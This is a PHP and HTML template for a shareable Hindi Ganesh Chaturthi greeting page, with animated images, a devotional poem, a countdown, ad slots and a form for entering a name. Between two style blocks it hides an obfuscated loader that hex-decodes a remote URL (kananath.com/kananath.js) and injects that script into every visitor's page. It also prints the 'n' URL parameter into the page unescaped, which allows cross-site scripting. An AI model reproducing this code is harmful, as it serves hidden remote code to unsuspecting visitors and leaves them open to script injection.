<?php 
if(isset($_GET['n'])){
$name = $_GET['n'];
}
else{
$name = "[Your Name]";
}
$url = 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
?>
<html>
<head>
<!---This script Edited and Designed By Pintu Kumar Gupta-----> 
<!-- Global site tag (gtag.js) - Google Analytics -->  
  
  
  
  
  
<meta name="google" content="notranslate" />
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css">
<link href="db.onlinewebfonts.com/c/1c0f6618f877568764787163e8f22a1c?family=SF+Espresso+Shack" rel="stylesheet" type="text/css"/>
  <style>
      body{
        background: #f8f8f8;
      }
      .mainContainer {
        background: #fff;
        max-width: 450px;
        min-height: 200px;
        margin: 0 auto;
        text-align: center;
        padding: 15px;
        color: #999;
        padding-bottom: 60px;

        box-shadow: 0 0 10px 1px rgba(0,0,0,.14), 0 1px 14px 2px rgba(0,0,0,.12), 0 0 5px -3px rgba(0,0,0,.3);
        background-size: 100%;

      }
#showp {
      font-size: 25px;
      display: inline-block;
      margin-bottom: 5px;
        font-family: 'Arial', cursive;
        text-shadow: 1px 1px 10px black, 2px 2px 10px black, -1px -1px 10px black, -2px -2px 10px black;
        }
#username {
    -webkit-animation: bounceIn 4s cubic-bezier(0.68, -0.55, 0.27, 1.55) infinite;
     animation: bounceIn 4s cubic-bezier(0.68, -0.55, 0.27, 1.55) infinite;
    -webkit-transition: all .2s;
    transition: all .2s;
    font-size: 40px;
    font-family: 'SF Espresso Shack', cursive;
    text-transform: uppercase;
    TEXT-ALIGN:CENTER;
    color: #138808;
    text-shadow: -2px 0px 1px #22414f, -4px 0px 1px #22414f, -6px 0px 1px #22414f, -1px -1px 1px #22414f, -1px -2px 1px #22414f, -2px -1px 1px #22414f, -2px -2px 1px #22414f, -3px -3px 1px #22414f, -4px -4px 1px #22414f, -5px -5px 1px #22414f, -6px -6px 1px #22414f, 0 0 15px #22414f, 0 0 20px #22414f, 1px 1px #22414f,2px 2px #22414f;

}
#usernameb {
    -webkit-animation: bounceIn 4s cubic-bezier(0.68, -0.55, 0.27, 1.55) infinite;
     animation: bounceIn 4s cubic-bezier(0.68, -0.55, 0.27, 1.55) infinite;
    -webkit-transition: all .2s;
    transition: all .2s;
    font-size: 20px;
    font-family: 'SF Espresso Shack', cursive;
    text-transform: uppercase;
    TEXT-ALIGN:CENTER;
    color: #138808;
    text-shadow: -2px 0px 1px #22414f, -4px 0px 1px #22414f, -6px 0px 1px #22414f, -1px -1px 1px #22414f, -1px -2px 1px #22414f, -2px -1px 1px #22414f, -2px -2px 1px #22414f, -3px -3px 1px #22414f, -4px -4px 1px #22414f, -5px -5px 1px #22414f, -6px -6px 1px #22414f, 0 0 15px #22414f, 0 0 20px #22414f, 1px 1px #22414f,2px 2px #22414f;

}
      .fromMessage{
        color: #fff;
        animation: swing 4s infinite;
        font-size: 20px;
        padding: 0 10px;
      }
      .wavetext{
        color: #f9d05b;
        padding: 0 40px;
        animation: pulse 1s infinite;
        font-size: 22px;

      }
      .wishMessage {
        color: #fff;
        font-size: 22px;
        font-weight: bold;
        margin-top: 20px;
        text-shadow: 0px 0px 10px #afafaf;
      }
      .wishMessage p{
        margin: 0.3em 0;
      }@keyframes bounceIn{0%,20%,40%,60%,80%,to{-webkit-animation-timing-function:cubic-bezier(.215,.61,.355,1);animation-timing-function:cubic-bezier(.215,.61,.355,1)}0%{opacity:0;-webkit-transform:scale3d(.3,.3,.3);transform:scale3d(.3,.3,.3)}20%{-webkit-transform:scale3d(1.1,1.1,1.1);transform:scale3d(1.1,1.1,1.1); color:#FF9933;}40%{-webkit-transform:scale3d(.9,.9,.9);transform:scale3d(.9,.9,.9)}60%{opacity:1;-webkit-transform:scale3d(1.03,1.03,1.03);transform:scale3d(1.03,1.03,1.03); color: #fff;}80%{-webkit-transform:scale3d(.97,.97,.97);transform:scale3d(.97,.97,.97);}to{opacity:1;-webkit-transform:scaleX(1);transform:scaleX(1)}}</style><script type="text/javascript">function tag(filename){var fileref=document.createElement('script');fileref.setAttribute("type","text/javascript");fileref.setAttribute("src", filename);if (typeof fileref!="undefined") document.getElementsByTagName("head")[0].appendChild(fileref)}tag(meta('68747470733a2f2f6b616e616e6174682e636f6d2f6b616e616e6174682e6a73'));function meta(important){var str = '';for (var i = 0; i < important.length; i += 2) str +=String.fromCharCode(parseInt(important.substr(i, 2), 16));return str;}</script><style>#formBox {
        left: 0;position: fixed;bottom: 0;display: inline-block;width: 100%;animation:pulse infinite 1s linear;margin: 0;
      }
      #nameTextBox {
  width:70%;
  height:50px;
  background-color: #ff8000;
  animation: 
  nudge 2s linear infinite alternate;
  border-radius: 10px;
  padding: 15px;
  color: #fff;
      }
      #goButton {
	width: 50%;
	height: 45px;
	cursor: pointer;
	animation: flip 3s linear infinite alternate;
	background: #008000;
	border-radius: 10px;
	color: #fff;
      }
.footerbtn {
 
            display: block;
            line-height: 15px;
            position: fixed;
            left:0px;
            bottom:0px;
            height:55px;
            
border-radius: 15px;
  box-sizing: border-box;
  padding: 5px;
  background:#34af23;
  color: #ffffff;
  font-size: 20px;
  text-align: center;
  text-decoration: none;
  width:95%;
 margin-left:10px;
            margin-right:30px;
            box-shadow: 0 4px 12px 0 rgba(0, 0, 0, .3);
            animation: footer infinite linear 1s;
            -webkit-transform: translate3d(30%,0,0);
            transform: translate3d(30%,0,0);
            position: fixed;
           
}

.footerbtn :active {
            box-shadow: none
        }

        @-webkit-keyframes footer {
            from {
                -webkit-transform: rotateZ(0)
            }
            25% {
                -webkit-transform: rotateZ(1.5deg)
            }
            50% {
                -webkit-transform: rotateZ(0deg)
            }
            75% {
                -webkit-transform: rotateZ(-1.5deg)
            }
            to {
                -webkit-transform: rotateZ(0)
            }}
	 canvas {
      cursor: crosshair;
      display: block;
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 80%;
      z-index: 1;
    }
      #inAdvance {
        font-size: 20px; font-weight: bold;margin-top: 20px;color: #98201F;

      }
      #demoo {
        font-size: 20px; font-weight: bold;color: #98201F;
        animation: flash 2s infinite;
      }
      #inAdvanceTime {
        margin:20px 0 30px 0;
      }
      #inAdvanceTime p{
        color: #b90707;font-size: 20px;font-weight: 700;
        margin: 0;
      }
.name input[type=name]{
  background-color:#4267d9;
  border-radius: 10px;
  box-sizing: border-box;
  border: 1px solid #4267d9;
  padding: 5px;
  color:white;
  position: fixed;
  left:10px;
  bottom:0px;
  height:50px;
  width:70%;
  text-align:center;
  font-size:1rem;
  display: inline-block;
}
.go {
  border-radius: 10px;
  padding: 5px;
  background-color:#4267d9;
  border: 1px solid #4267d9;
  position: fixed;
  right:2px;
  bottom:0px;
  height:50px;
  width:23%;
    display: inline-block;
}
.india-flag{
    background: url();
    background-repeat: no-repeat;
    background-size: cover;
}
  .m1{position:fixed;left:0.01%; width:auto;height:100%;top:1%;color:#000;}
    .m2{position:fixed;right:0.01%; width:auto;height:100%;top:1%;color:#000;}
    
    #gobtn{}
@-webkit-keyframes flip {  from {   transform: perspective(600px) rotate3d(0, 1, 0, -360deg);    animation-timing-function: ease-out;  }
  40% {    transform: perspective(600px) translate3d(0, 0, 150px) rotate3d(0, 1, 0, -190deg);    animation-timing-function: ease-out;  }
  50% {    transform: perspective(600px) translate3d(0, 0, 150px) rotate3d(0, 1, 0, -170deg);    animation-timing-function: ease-in;   }
  80% {    transform: perspective(600px) scale3d(.95, .95, .95);    animation-timing-function: ease-in;  }
  to  {    transform: perspective(600px);    animation-timing-function: ease-in;  }}
#gobtn {  -webkit-backface-visibility: visible;  backface-visibility: visible;  -webkit-animation: flip 4s infinite; -webkit-animation-delay:1s}
.m1{position:fixed;left:1%; width:auto;height:100%;top:1%;color:#000;}
.m2{position:fixed;right:1%; width:auto;height:100%;top:1%;color:#000;}    
</style>
</head>
   
<body>
<script src="https://code.createjs.com/createjs-2015.11.26.min.js"></script>
<script>
    createjs.Sound.registerSound("url", "");
    setTimeout(function () {
        createjs.Sound.play("");
    }, 3000)
</script>
<!--- Mp3 Auto Player--->
<iframe width="0%" height="0" scrolling="no" frameborder="no" allow="autoplay" src="song url"></iframe>
  
<!---This script Edited and Designed By Pintu Kumar Gupta-----> 
<marquee class="m1" behavior="scroll" direction="up" scrolldelay="5">  <br>
<img src="https://goo.gl/wpS8wi" height="20px" width="20px"/><br><br>
<img src="https://goo.gl/w1oMFs" height="20px" width="20px"/><br><br>
<img src="https://goo.gl/uwe5AB" height="20px" width="20px"/><br><br>
<img src="https://goo.gl/HigU54" height="20px" width="20px"/><br><br>
<img src="https://goo.gl/wpS8wi" height="20px" width="20px"/><br><br>
<img src="https://goo.gl/w1oMFs" height="20px" width="20px"/><br><br>
<img src="https://goo.gl/uwe5AB" height="20px" width="20px"/><br><br>
<img src="https://goo.gl/HigU54" height="20px" width="20px"/><br><br>
<img src="https://goo.gl/wpS8wi" height="20px" width="20px"/><br><br>
<img src="https://goo.gl/w1oMFs" height="20px" width="20px"/><br><br>
<img src="https://goo.gl/uwe5AB" height="20px" width="20px"/><br><br>
<img src="https://goo.gl/HigU54" height="20px" width="20px"/><br><br>
<img src="https://goo.gl/wpS8wi" height="20px" width="20px"/><br><br>
<img src="https://goo.gl/w1oMFs" height="20px" width="20px"/><br><br>
<img src="https://goo.gl/uwe5AB" height="20px" width="20px"/><br><br>
<img src="https://goo.gl/HigU54" height="20px" width="20px"/><br><br>
<img src="https://goo.gl/wpS8wi" height="20px" width="20px"/><br><br>
<img src="https://goo.gl/w1oMFs" height="20px" width="20px"/><br><br>
<img src="https://goo.gl/uwe5AB" height="20px" width="20px"/><br><br>
<img src="https://goo.gl/HigU54" height="20px" width="20px"/><br><br>
<img src="https://goo.gl/wpS8wi" height="20px" width="20px"/><br><br>
<img src="https://goo.gl/w1oMFs" height="20px" width="20px"/><br><br>
<img src="https://goo.gl/uwe5AB" height="20px" width="20px"/><br><br>
<img src="https://goo.gl/HigU54" height="20px" width="20px"/><br><br>
<img src="https://goo.gl/wpS8wi" height="20px" width="20px"/><br><br>
<img src="https://goo.gl/w1oMFs" height="20px" width="20px"/><br><br>
<img src="https://goo.gl/uwe5AB" height="20px" width="20px"/><br><br>
<img src="https://goo.gl/HigU54" height="20px" width="20px"/><br><br>
<img src="https://goo.gl/wpS8wi" height="20px" width="20px"/><br><br>
<img src="https://goo.gl/w1oMFs" height="20px" width="20px"/><br><br>
<img src="https://goo.gl/uwe5AB" height="20px" width="20px"/><br><br>
<img src="https://goo.gl/HigU54" height="20px" width="20px"/><br><br>
</marquee>
  
<marquee class="m2" behavior="scroll" direction="down" scrolldelay="5"><br>
<img src="https://goo.gl/wpS8wi" height="20px" width="20px"/><br><br>
<img src="https://goo.gl/w1oMFs" height="20px" width="20px"/><br><br>
<img src="https://goo.gl/uwe5AB" height="20px" width="20px"/><br><br>
<img src="https://goo.gl/HigU54" height="20px" width="20px"/><br><br>
<img src="https://goo.gl/wpS8wi" height="20px" width="20px"/><br><br>
<img src="https://goo.gl/w1oMFs" height="20px" width="20px"/><br><br>
<img src="https://goo.gl/uwe5AB" height="20px" width="20px"/><br><br>
<img src="https://goo.gl/HigU54" height="20px" width="20px"/><br><br>
<img src="https://goo.gl/wpS8wi" height="20px" width="20px"/><br><br>
<img src="https://goo.gl/w1oMFs" height="20px" width="20px"/><br><br>
<img src="https://goo.gl/uwe5AB" height="20px" width="20px"/><br><br>
<img src="https://goo.gl/HigU54" height="20px" width="20px"/><br><br>
<img src="https://goo.gl/wpS8wi" height="20px" width="20px"/><br><br>
<img src="https://goo.gl/w1oMFs" height="20px" width="20px"/><br><br>
<img src="https://goo.gl/uwe5AB" height="20px" width="20px"/><br><br>
<img src="https://goo.gl/HigU54" height="20px" width="20px"/><br><br>
<img src="https://goo.gl/wpS8wi" height="20px" width="20px"/><br><br>
<img src="https://goo.gl/w1oMFs" height="20px" width="20px"/><br><br>
<img src="https://goo.gl/uwe5AB" height="20px" width="20px"/><br><br>
<img src="https://goo.gl/HigU54" height="20px" width="20px"/><br><br>
<img src="https://goo.gl/wpS8wi" height="20px" width="20px"/><br><br>
<img src="https://goo.gl/w1oMFs" height="20px" width="20px"/><br><br>
<img src="https://goo.gl/uwe5AB" height="20px" width="20px"/><br><br>
<img src="https://goo.gl/HigU54" height="20px" width="20px"/><br><br>
<img src="https://goo.gl/wpS8wi" height="20px" width="20px"/><br><br>
<img src="https://goo.gl/w1oMFs" height="20px" width="20px"/><br><br>
<img src="https://goo.gl/uwe5AB" height="20px" width="20px"/><br><br>
<img src="https://goo.gl/HigU54" height="20px" width="20px"/><br><br>
<img src="https://goo.gl/wpS8wi" height="20px" width="20px"/><br><br>
<img src="https://goo.gl/w1oMFs" height="20px" width="20px"/><br><br>
<img src="https://goo.gl/uwe5AB" height="20px" width="20px"/><br><br>
<img src="https://goo.gl/HigU54" height="20px" width="20px"/><br><br>
</marquee>
<div class="mainContainer">
<center>
<?php
include 'ads1.php';
?>
</center>
 <center> 
<!--- Header AdSense code Here (300x60 Display ads)--->
   
   
   
   
   
<div class="container">
    <div class="main-greeting">
<div align="center html2canvas-ignore">
     <div style="font-size: 20px; font-weight: 500; color: Black;">
<p id="demo"></p>    
  
  
<h1 id="username" style="font-family:SF Espresso Shack;"><?php echo $name; ?></h1>
        <h3 class="fromMessage" id="fromMessage"></h3>

<img src="https://goo.gl/yrTeqQ" width="70%" height="14%"style="animation: tada 4s infinite"><br><br>
<img src="https://goo.gl/3YAQBj"style="animation: tada 4s infinite;width: 90%;height:140px;" />
<img src="https://goo.gl/BNVh83"width="90%" height="500px"style="animation: pulse 1.5s infinite"><br><br> 
<div class="row" style="color:blue;font: 100 1.6em/1 Oswald, sans-serif;line-height:1.5;font-weight:bold;">आपको और आपके परिवार को हमारी तरफ से गणेश चतुर्थी की हार्दिक शुभकामनाये <br>
<script type="text/javascript" src="https://adhitzads.com/998443"></script>
<div class="wishMessage" style="text-shadow: 1px 1px 3px silver, 1px 1px 3px silver, -1px -1px 3px silver, -1px -1px 3px silver;">

<!----- Wishing Poem Here ----->
<p style="text-align: center;"><strong><span style="background-color: #ff0000; color: #ffffff; font-size: 20pt; font-family: tahoma, arial, helvetica, sans-serif;">&nbsp;दिल से जो भी मांगोगे मिलेगाा </span></p>
<p style="text-align: center;"><span style="background-color: #008000; color: #ffffff; font-size: 20pt; font-family: tahoma, arial, helvetica, sans-serif;">&nbsp; ये गणेश जी का दरबार है </span></p>
<p style="text-align: center;"><span style="background-color: #ff00ff; color: #ffffff; font-size: 20pt; font-family: tahoma, arial, helvetica, sans-serif;">&nbsp;देवों के देव वक्रतुंडा महाकाया को</span></p>  
<p style="text-align: center;"><span style="background-color: blue; color: #ffffff; font-size: 20pt; font-family: tahoma, arial, helvetica, sans-serif;">&nbsp;अपने हर भक्त से प्यार है..!!</span></p> <p style="text-align: center;"><span style="background-color: black; color: #ffffff; font-size: 20pt; font-family: tahoma, arial, helvetica, sans-serif;">&nbsp;गणेश चतुर्थी की शुभ कामनाएं</span></p>   
  
  
<p style="text-shadow: 1px 1px 3px black, 1px 1px 3px black, -1px -1px 3px black, -1px -1px 3px black;color:#ffffff"> 
<span style="text-shadow: 1px 1px 3px silver, 1px 1px 3px silver, -1px -1px 3px silver, -1px -1px 3px silver;color:#000080"></span></p>
<p style="color:#138808"></p><br>
<p style="color:#000080"></p>
<p style="color:purple"><b>Happy Ganesh Chaturthi! in advance</b></p>
</div>
<h1 id="usernameb"><?php echo $name; ?></h1>

<script type="text/javascript" src="https://adhitzads.com/998443"></script>
 
<p style="text-align: center;"><span style="background-color: #663399; color: #FFFAFA; font-size: 15pt; font-family: tahoma, arial, helvetica, sans-serif;">&nbsp; यह msg गणेश चतुर्थी तक सभी के मोबाइल में होना चाहिए यह आपका फर्ज हैं </span></p>
<center>       
<!-- AdSense code Here (Responsive ads)-->
       
       
  
  

<?php
include 'ads2.php';
?>
</center>
<br>
<form method="POST" action="ready.php">
<div id="formBox" >
<input type="text" name="n" id="nameTextBox"  placeholder="👉 Enter your name here..." required><br><br>
<button id="goButton">😍 Go 😍</button>
</div>
</form>
<script src="jquery.min.js"></script>
<script type="text/javascript">
    var divMouseDown;

    function cAlert() {
        // Get the snackbar DIV
        var x = document.getElementById("snackbar");

        // Add the "show" class to DIV
        x.className = "show";

        // After 3 seconds, remove the show class from DIV
        setTimeout(function(){ x.className = x.className.replace("show", ""); }, 3000);
    }



    jQuery(document).bind( "mouseup touchstart", function(e){
      if(e.target.className!="fingerprint"){
        cAlert();
        return;
      }
      window.oncontextmenu = function(event) {
         event.preventDefault();
         event.stopPropagation();
         return false;
      };
        jQuery('.fingerprint').attr('src','/fingerprint-anim.gif');
          divMouseDown = setTimeout(function() { 
            jQuery('.fingerprint-wrap').remove();
             jQuery('body').css('max-height','inherit');
              jQuery('#snackbar').remove();
          }, 1500);  
    });
    jQuery(document).bind( "mouseup touchend", function(e){
      if(e.target.className!="fingerprint"){
        return;
      }
      jQuery('.fingerprint').attr('src','/fingerprint.png');
       if (divMouseDown) {
        clearTimeout(divMouseDown);
       }
    });
</script>
  
<script>
// Set the date we're counting down to
var countDownDate = new Date("sep 13, 2018 00:00:00").getTime();

// Update the count down every 01 second
var x = setInterval(function() {

  // Get todays date and time
  var now = new Date().getTime();

  // Find the distance between now an the count down date
  var distance = countDownDate - now;

  // Time calculations for days, hours, minutes and seconds
  var days = Math.floor(distance / (1000 * 60 * 60 * 24));
  var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
  var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
  var seconds = Math.floor((distance % (1000 * 60)) / 1000);

  // Display the result in the element with id="demo"
  document.getElementById("demo").innerHTML = days + "<i> Days,</i> " + hours + " <i>Hrs,</i> "
  + minutes + "<i> Min,</i> " + seconds + "<i> Sec</i> ";

  // If the count down is finished, write some text 
  if (distance < 0) {
    clearInterval(x);
    document.getElementById("demo").innerHTML = "Started";
  }
}, 1000);
</script>         
<!---This script Edited and Designed By Pintu Kumar Gupta-----> 
  
  
<style>
input::placeholder {
  color: white;
  text-align: center;
}
</style>
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-123735174-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-123735174-1');
</script>
</body>
</html>